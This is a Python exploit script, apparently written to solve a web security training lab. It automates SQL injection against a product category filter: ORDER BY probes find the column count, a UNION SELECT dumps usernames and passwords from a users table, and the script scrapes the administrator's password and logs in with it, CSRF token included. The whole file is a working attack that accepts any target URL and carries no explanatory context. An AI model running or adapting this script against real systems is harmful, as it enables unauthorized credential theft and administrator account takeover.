import urllib3
import sys
import requests
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def Number_of_cols(url:str):
    url = url + '/filter?category=Gifts'
    # The application uses this sql query to filter by category: SELECT * FROM products WHERE category = ''
    # Determining the number of columns so it help us in exploiting the sqli with union statement
    payload = "'ORDER BY "
    for i in range(1, 20):
        try:
            r = requests.get(url + payload + f"{i}--",verify=False, proxies=proxies)
            if r.status_code == 500:
                return i - 1
        except requests.exceptions.RequestException as ex:
            print(f"Error: {ex}")
            return None
    return None

def extract_admin_password(url:str):
    payload = "username, password FROM users--"
    url = url + "/filter?category=" + "Gifts' UNION SELECT " + payload
    try:
        r = requests.get(url, proxies=proxies, verify=False)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, 'html.parser')
            password = soup.find(string='administrator').parent.find_next('td').contents[0]
            return password
        else:
            print("Failed to extract password")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def get_csrf(url:str, s:requests.Session):
    try:
        r = s.get(url +'/login', verify=False, proxies=proxies, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {'name':'csrf'})['value']
        return csrf
    except requests.exceptions.RequestException as ex:
        print(f"Error {ex}")
        return None


def login(url:str, s:requests.Session, csrf:str, password:str):
    login_url = url + '/login'
    login_data = {'csrf': csrf, 'username': 'administrator', 'password': password}
    try:
        r = s.post(login_url, login_data, verify=False, proxies=proxies, timeout=5)
        response = r.text
        if 'Log out' in response:
            print("Logged in successfully")
            return True
        else:
            print("Failed to log in")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')

    cols = Number_of_cols(url)
    if cols:
        print(f"Num of cols: {cols}")
    else:
        print("Failed to determine num of cols")
        sys.exit(-1)
    
    admin_password = extract_admin_password(url)
    if admin_password:
        s = requests.Session()
        csrf = get_csrf(url, s)
        if login(url, s, csrf, admin_password):
            print("Lab Solved!")
            sys.exit(0)
        else:
            sys.exit(-1)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()